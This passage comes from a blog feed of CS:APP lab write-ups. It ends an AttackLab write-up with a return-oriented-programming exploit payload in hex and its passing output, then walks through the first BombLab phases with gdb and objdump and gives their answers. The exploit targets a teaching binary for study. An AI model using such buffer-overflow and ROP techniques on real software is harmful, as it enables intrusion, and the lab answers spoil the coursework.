ff</span><br><span class="line">ff ff ff ff ff ff ff ff ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61</span><br><span class="line">00 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br></pre></td></tr></table></figure><p>测试，成功pass!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 ./hex2raw &lt;phase_5.txt &gt;phase_5-raw.txt</span><br><span class="line">➜  target1 ./rtarget -q &lt;phase_5-raw.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:rtarget:3:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 FF FF FF FF FF FF FF</span><br></pre></td></tr></table></figure><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>ROP相对于CI来说难上了不少，主要难度在于我们可以使用的命令的种类被限定死了，只能通过现有的代码想办法去拼凑出我们想实现的结果，往往为了将一个值送到某个寄存器，我们需要经过很多次mov操作才能实现，其实一开始走了弯路，如果将start_farm到end_farm之间所有提供的操作都列出的话，进行相关的设计就简单上不少。总的来说ROP这一部分的实验也让我看到了缓冲区溢出攻击的威力，明白了为什么类似于gets这样的函数在后来的改进版本中都需要限定输入长度的原因。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;AttackLab&quot;&gt;&lt;a href=&quot;#AttackLab&quot; class=&quot;headerlink&quot; title=&quot;AttackLab&quot;&gt;&lt;/a&gt;AttackLab&lt;/h1&gt;&lt;h2 id=&quot;实验目标&quot;&gt;&lt;a href=&quot;#实验目标&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="csapp" scheme="lengyu.me/categories/csapp/"/>
    
    
      <category term="csapp" scheme="lengyu.me/tags/csapp/"/>
    
      <category term="工程向" scheme="lengyu.me/tags/%E5%B7%A5%E7%A8%8B%E5%90%91/"/>
    
      <category term="计算机体系" scheme="lengyu.me/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
  </entry>
  
  <entry>
    <title>CS:APP BombLab</title>
    <link href="lengyu.me/2018/08/20/CS:APP-BombLab/"/>
    <id>lengyu.me/2018/08/20/CS:APP-BombLab/</id>
    <published>2018-08-20T14:45:56.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BoomLab"><a href="#BoomLab" class="headerlink" title="BoomLab"></a>BoomLab</h1><p>这个实验非常有意思，需要利用csapp里面第三章学到的x86-64汇编知识以及一些逆向的技巧，来破解程序的的意图，输入正确的指令。</p><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>对于给出的一个二进制文件，寻找正确的输入，当输入错误的时候，会提示“Boom!”意味着拆弹失败，二进制炸弹爆炸。实验总共有6个普通关卡和一个附加关卡,也就是说，总共需要破解7个输入。</p><h2 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h2><h3 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h3><p>下载并阅读<a href="http://csapp.cs.cmu.edu/3e/bomblab.pdf" target="_blank" rel="noopener">实验指导书</a><br>下载并解压缩<a href="http://csapp.cs.cmu.edu/3e/bomb.tar" target="_blank" rel="noopener">实验材料</a><br>部署gcc、objdump、gdb环境。<br><del>肥宅快乐水</del></p><h3 id="x86-64-汇编的参数传递"><a href="#x86-64-汇编的参数传递" class="headerlink" title="x86_64 汇编的参数传递"></a>x86_64 汇编的参数传递</h3><p>编译器会按照函数参数从左到右的顺序，依次分配以下寄存器。</p><table><thead><tr><th>操作数大小</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th></tr></thead><tbody><tr><td>64</td><td>%rdi</td><td>%rsi</td><td>%rdx</td><td>%rcx</td><td>%r8</td><td>%r9</td></tr><tr><td>32</td><td>%edi</td><td>%esi</td><td>%edx</td><td>%ecx</td><td>%r8d</td><td>%r9d</td></tr><tr><td>16</td><td>%di</td><td>%si</td><td>%dx</td><td>%cx</td><td>%r8w</td><td>%r9w</td></tr><tr><td>8</td><td>%dil</td><td>%sil</td><td>%dl</td><td>%cl</td><td>%r8d</td><td>%r9b</td></tr></tbody></table><p>而对于一个函数的返回值，如果是非浮点数，一般是存储在%rax或者相关寄存器。</p><h3 id="大小端"><a href="#大小端" class="headerlink" title="大小端"></a>大小端</h3><p>x86-64处理器采用小端法存储数据，也就是数据的高位字节存储在低地址处。</p><h3 id="gdb调试工具"><a href="#gdb调试工具" class="headerlink" title="gdb调试工具"></a>gdb调试工具</h3><p>对于gdb调试，我列出几条这个实验用的最多的命令。</p><blockquote><p>break function 在function函数的入口处打一个断点<br>break *address 在地址address处打一个断点</p></blockquote><p>example:</p><blockquote><p>break main 在main函数入口处打一个断点<br>break *0x4c00 在地址0x4c00处打一个断点</p></blockquote><blockquote><p>run            开始运行<br>stepi           单步执行<br>step n          单步执行n步<br>continue        执行到下一个断点<br>info register   查看寄存器的值</p></blockquote><p>特别的，对于打印值，给出网上的资料</p><blockquote><p>x/&lt;n/f/u&gt; <addr><br>n、f、u是可选的参数，<addr>表示一个内存地址<br>1） n 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容<br>2） f 表示显示的格式<br>3） u 表示将多少个字节作为一个值取出来，如果不指定的话，GDB默认是4个bytes，如果不指定的话，默认是4个bytes。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。<br>参数 f 的可选值：<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串格式显示变量<br>参数 u 可以用下面的字符来代替：<br>b 表示单字节<br>h 表示双字节<br>w 表示四字节<br>g 表示八字节</addr></addr></p></blockquote><p>对于此次试验，用的比较多的例子是:</p><blockquote><p>x/s 0x4ab    打印地址0x4ab处的字符串</p></blockquote><h3 id="dumpobj工具"><a href="#dumpobj工具" class="headerlink" title="dumpobj工具"></a>dumpobj工具</h3><p>objdump -t    加载二进制文件的符号表<br>objdump -d    加载二进制文件的汇编代码</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>因为objdump之后的汇编代码里面有大量的十六进制运算，故我采用python作为一个简单的计算器，在python中可以这样进行计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">0xa</span></span><br><span class="line">b=<span class="number">0xb</span></span><br><span class="line">c=a+b</span><br><span class="line">print(<span class="string">"%#x"</span>,%c)</span><br></pre></td></tr></table></figure><p>上面这段代码表示将0xa和0xb加起来并且以十六进制的格式打印</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先采用下面两条命令保存符号表和汇编代码，方便查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#objdump -t bomb &amp;&gt;tag</span><br><span class="line">#objdump -d bomb &amp;&gt;asm</span><br></pre></td></tr></table></figure><p>接着可以打开符号表，这里面存储了该二进制文件的符号信息。我们只关心第三列，如果第三列为F，表示为function，是一个函数名。</p><h2 id="拆弹开始"><a href="#拆弹开始" class="headerlink" title="拆弹开始!"></a>拆弹开始!</h2><p>凭借经验，我们猜测这个东西，是以main作为入口的，<del>因为main是c语言的入口，而csapp里面都是c语言233</del>，去tag里面搜索main，果然有！那么转到asm看汇编代码，全局搜索main，共有8次记录，很轻易的我们就找到了main函数对应部分的汇编代码。是以这样的形式开头的，这也是汇编函数开头的形式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000400da0 &lt;main&gt;:</span><br><span class="line">  400da0:53                   push   %rbx</span><br><span class="line">  400da1:83 ff 01             cmp    $0x1,%edi</span><br><span class="line">  400da4:75 10                jne    400db6 &lt;main+0x16&gt;</span><br></pre></td></tr></table></figure><p>表示main函数地址为0x0000000000400da0，第一行代码是push %rbx，对应的机器码是53，该行代码地址为400da0。通看这一段代码，可以发现一大堆没啥用的部分，对于拆弹没有关系，比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">400dc7:e8 44 fe ff ff       callq  400c10 &lt;fopen@plt&gt;</span><br></pre></td></tr></table></figure><p>表明使用了fopen函数，这个可能是用来支持直接从文件中读入而不用每次都手动输入的这个特性。往后我们看到了有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">400e19:e8 84 05 00 00       callq  4013a2 &lt;initialize_bomb&gt;</span><br><span class="line">400e1e:bf 38 23 40 00       mov    $0x402338,%edi</span><br><span class="line">400e23:e8 e8 fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">400e28:bf 78 23 40 00       mov    $0x402378,%edi</span><br><span class="line">400e2d:e8 de fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">400e32:e8 67 06 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:48 89 c7             mov    %rax,%rdi</span><br><span class="line">400e3a:e8 a1 00 00 00       callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:e8 80 07 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:bf a8 23 40 00       mov    $0x4023a8,%edi</span><br><span class="line">400e49:e8 c2 fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">400e4e:e8 4b 06 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">400e53:48 89 c7             mov    %rax,%rdi</span><br><span class="line">400e56:e8 a1 00 00 00       callq  400efc &lt;phase_2&gt;</span><br><span class="line">400e5b:e8 64 07 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e60:bf ed 22 40 00       mov    $0x4022ed,%edi</span><br><span class="line">400e65:e8 a6 fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">400e6a:e8 2f 06 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">400e6f:48 89 c7             mov    %rax,%rdi</span><br><span class="line">400e72:e8 cc 00 00 00       callq  400f43 &lt;phase_3&gt;</span><br><span class="line">400e77:e8 48 07 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure><p>先是init_bomb，感觉上可能密码藏在这里面，然后搜索跳转过去发现啥也没有<del>显然不会这么简单啊！</del>然后是两个put一个read_line接一个phase_i和phase_defuse。而如果运行bomb，会发现他的交互模式是先打印几句话，然后让你输入一句话，然后判断是否正确。于是猜测puts是没啥卵用的<del>很显然嘛，怎么可能有用</del>,read_line是用来读入的，可能在读入里面进行了判断，然后跳转过去，发现啥也没有<del>傻啊你，怎么可能会在readline里面判断</del>，于是代码核心部分应该在phase_i和phase_defused，而我们发现phase_defused是六次相同的函数，直接翻过去看这个函数，发现里面应该没有利用static或者全局变量判断第几次进入的方法，大概率密码不会藏在里面，于是乎，结果就只能在phase_i里面了！</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>第一个关卡，正式开始我们的拆弹之旅！搜索phase_1，找到了如下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400ee4:be 00 24 40 00       mov    $0x402400,%esi</span><br><span class="line">  400ee9:e8 4a 04 00 00       callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:85 c0                test   %eax,%eax</span><br><span class="line">  400ef0:74 05                je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:e8 43 05 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  400efb:c3                   retq</span><br></pre></td></tr></table></figure><p>非常的短，第一关显然也不会那么难。读一下结构，先分配了8大小的栈空间，然后把一个值丢到了%esi里面，然后调用了strings_not_equal，判断返回值是否为0，如果为0就跳转到$phase_1+0x17$的位置，否则就调用explode_bomb，凭借多年的代码下毒经验，我猜测strings_not_equal和explode_bomb的函数功能不会完全与名字一致<del>自己下毒也别怀疑别人下毒啊喂</del>于是乎花费了大量时间进去找找找，结果发现自己是个sb。<br>排除了这种可能，我们重新观察这段代码，strings_not_equal显然是要比较两个字符串是否相等，这两个字符串如何传入呢？我们发现这样一段写死的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">400ee4:be 00 24 40 00       mov    $0x402400,%esi</span><br></pre></td></tr></table></figure><p>把$0x402400的值送到%esi里面，紧接着就调用了string_not_equal!esi是函数的第二个参数，而$0x402400是一个立即数，与我们的输入无关，密码应该与0x402400有关！然后尝试去tag和asm里面全局搜索这个值，一无所获。<del>傻了吧</del>，于是乎尝试用gdb运行bomb，在phase_1打上断点，用字符串形式打印这个地址的值，有了!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure><p>这显然是一串有意义的字符串而非乱码，那就是他了！输入这串字符串，顺利过关。</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>有了前一关的经验，直接跳到phase_2的汇编代码，这就有那么一点长了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:55                   push   %rbp</span><br><span class="line">  400efd:53                   push   %rbx</span><br><span class="line">  400efe:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  400f02:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">  400f05:e8 52 05 00 00       callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:83 3c 24 01          cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:74 20                je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:e8 25 05 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:eb 19                jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:8b 43 fc             mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:01 c0                add    %eax,%eax</span><br><span class="line">  400f1c:39 03                cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:74 05                je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:e8 15 05 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:48 83 c3 04          add    $0x4,%rbx</span><br><span class="line">  400f29:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">  400f2c:75 e9                jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:eb 0c                jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:48 8d 5c 24 04       lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:48 8d 6c 24 18       lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:eb db                jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  400f40:5b                   pop    %rbx</span><br><span class="line">  400f41:5d                   pop    %rbp</span><br><span class="line">  400f42:c3                   retq</span><br></pre></td></tr></table></figure><p>看了又看看了又看，我觉得玄机应该在read_six_numbers里面！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:48 83 ec 18          sub    $0x18,%rsp</span><br><span class="line">  401460:48 89 f2             mov    %rsi,%rdx</span><br><span class="line">  401463:48 8d 4e 04          lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:48 8d 46 14          lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:48 89 44 24 08       mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:48 8d 46 10          lea    0x10(%rsi),%rax</span><br><span class="line">  401474:48 89 04 24          mov    %rax,(%rsp)</span><br><span class="line">  401478:4c 8d 4e 0c          lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:4c 8d 46 08          lea    0x8(%rsi),%r8</span><br><span class="line">  401480:be c3 25 40 00       mov    $0x4025c3,%esi</span><br><span class="line">  401485:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  40148a:e8 61 f7 ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:83 f8 05             cmp    $0x5,%eax</span><br><span class="line">  401492:7f 05                jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:e8 a1 ff ff ff       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:48 83 c4 18          add    $0x18,%rsp</span><br><span class="line">  40149d:c3                   retq</span><br></pre></td></tr></table></figure><p>根据上面的经验，我们发现了这样一串代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">401480:be c3 25 40 00       mov    $0x4025c3,%esi</span><br></pre></td></tr></table></figure><p>难道说…..胜利就在眼前？<br>结果打印出来是…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%d %d %d %d %d %d</span><br></pre></td></tr></table></figure><p>啊血崩，被毒瘤了。不过这也给了我们一个启示，这第二个实验要求输入六个数字，为了考察这六个数字存储的位置，尝试在phase_2的0x400f0a处打上断点，运行程序。先输入第一关的密码，然后随便输入六个数字，观察phase_2的代码，我觉得读入的结果应该放在了$rsp处，因为他通过%rsi传入了read_six_numbers函数，于是打印从$rsp开始的一段空间的值，发现六个数字是顺序存放的，也就是说read_six_numbers函数并没有下毒，比如交换位置以增大破解难度什么的<del>这证明不是所有人都像我这么无聊</del>。现在要开始正式的破解了！<br>假设我的输入是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a b c d e f</span><br></pre></td></tr></table></figure><p>这六个数字，那么$%rsp+(i-1)*4$是输入的第i个数字的地址。观察phase_2的代码，显示调用了读入，然后判断(%rsp)是否为1，如果为1跳转到$phase_2+0x34$，否则就调用explode_bomb，那么很明显，a必须是1。找到$phase_2+0x34$处的代码，把b的地址赋给$rbx,然后把$rsp+0x18$这个值给了%rbp，因为$4*6=24=0x18$所以这个地址是比f还要大4。然后跳转到了$phase_2+0x40$处，把%rbx-4这个地址处的值赋予eax，然后eax乘2，判断是否等于%rbx地址处的值，不等就bomb….脑内过一遍代码之后，发现了这个逻辑，也就是说a必须是1，然后b、c、d、e、f必须是前一个数字的两倍，所以显然的答案就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 4 8 16 32</span><br></pre></td></tr></table></figure><p>过关!</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>这一关开始我有了经验<del>并没有人在代码里面下毒</del>，找到phase_3的代码，通览一遍。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:48 83 ec 18          sub    $0x18,%rsp</span><br><span class="line">  400f47:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:48 8d 54 24 08       lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:be cf 25 40 00       mov    $0x4025cf,%esi</span><br><span class="line">  400f56:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  400f5b:e8 90 fc ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:83 f8 01             cmp    $0x1,%eax</span><br><span class="line">  400f63:7f 05                jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:e8 d0 04 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:83 7c 24 08 07       cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:77 3c                ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:8b 44 24 08          mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:ff 24 c5 70 24 40 00 jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:b8 cf 00 00 00       mov    $0xcf,%eax</span><br><span class="line">  400f81:eb 3b                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:b8 c3 02 00 00       mov    $0x2c3,%eax</span><br><span class="line">  400f88:eb 34                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:b8 00 01 00 00       mov    $0x100,%eax</span><br><span class="line">  400f8f:eb 2d                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:b8 85 01 00 00       mov    $0x185,%eax</span><br><span class="line">  400f96:eb 26                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:b8 ce 00 00 00       mov    $0xce,%eax</span><br><span class="line">  400f9d:eb 1f                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:b8 aa 02 00 00       mov    $0x2aa,%eax</span><br><span class="line">  400fa4:eb 18                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:b8 47 01 00 00       mov    $0x147,%eax</span><br><span class="line">  400fab:eb 11                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:e8 88 04 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  400fb7:eb 05                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:b8 37 01 00 00       mov    $0x137,%eax</span><br><span class="line">  400fbe:3b 44 24 0c          cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:74 05                je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:e8 71 04 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:48 83 c4 18          add    $0x18,%rsp</span><br><span class="line">  400fcd:c3                   retq</span><br></pre></td></tr></table></figure><p>发现有一个sscanf和$0x4025cf这个魔法数被存到了esi，也就是sscanf的第二个参数，而我们知道sscanf第二个参数是format<del>怎么现在才想起来</del>。打印一下，果不其然</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%d %d</span><br></pre></td></tr></table></figure><p>也就是说要输入两个数，往后查找第三第四个参数%dx和%cx，发现这两个值是栈上分别偏移0x8和0xc的地址值。往后看，杜如以后先判断是否等于一，如果是就bomb，不然就跳转到0x400f6a,跳转之后比较一下第一个读入的值和7的关系，如果大于7直接Bomb，不然就继续，然后后面是一长串代码。注意这一串代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">400f75:ff 24 c5 70 24 40 00 jmpq   *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure><p>虽然不知道0x402470从哪来的，但是这串代码实现了一个很简单的功能，根据%rax的值去跳转到对应的位置，类似于switch case的功能，这是很显然的，往后看正好有7个mov jmp 的组合，猜测是从0-7对应下面的每一组mov jmp组合，这个组合实现了这样一个功能，这样这么长一段代码实现了这样一个功能，也就是根据a的值来比较b的值，也就是a、b有以下的对应关系</p><table><thead><tr><th>a</th><th>b</th></tr></thead><tbody><tr><td>0</td><td>0xcf</td></tr><tr><td>1</td><td>0x2c3</td></tr><tr><td>2</td><td>0x100</td></tr><tr><td>3</td><td>0x185</td></tr><tr><td>4</td><td>0xce</td></tr><tr><td>5</td><td>0x2aa</td></tr><tr><td>6</td><td>0x147</td></tr><tr><td>当一切遵从直觉之后，拆弹变得这么简单!<del>离死不远了</del>，然后测试，0正确，1…1bomb!为啥bomb了。。显然直觉出现了问题。反过头去看汇编代码，数了一下mov和jmp。发现mov + jmp是7个字节而非8个字节！这就很头疼了，需要去找一下0x402470是什么玩意儿，然后才能计算跳转的位置。找啊找找啊找并不能从代码中找到这个东西，于是尝试一下减少一下匹配，一位一位的添加，结果发现一个事实，前面的各种字符串常量，比如”%d %d”等都是用$0x4024**$指出的。。于是我们猜测这个值存放在内存中，gdb打印内存，果然</td><td></td></tr><tr><td><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x 0x402470</span><br><span class="line">0x402470:0x00400f7c</span><br></pre></td></tr></table></figure></td><td></td></tr></tbody></table><p><del>于是我们找到了起始地址为0x400f7c，所以跳转的地址应该是$0x400f7c+8*a$</del>谁告诉你的啊喂！作者居然在代码里下毒了！跳转地址并非顺序存放的！使用下面这条命令后，一切都揭晓了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/16x 0x402470</span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/16x 0x402470</span><br><span class="line">0x402470:0x00400f7c0x000000000x00400fb90x00000000</span><br><span 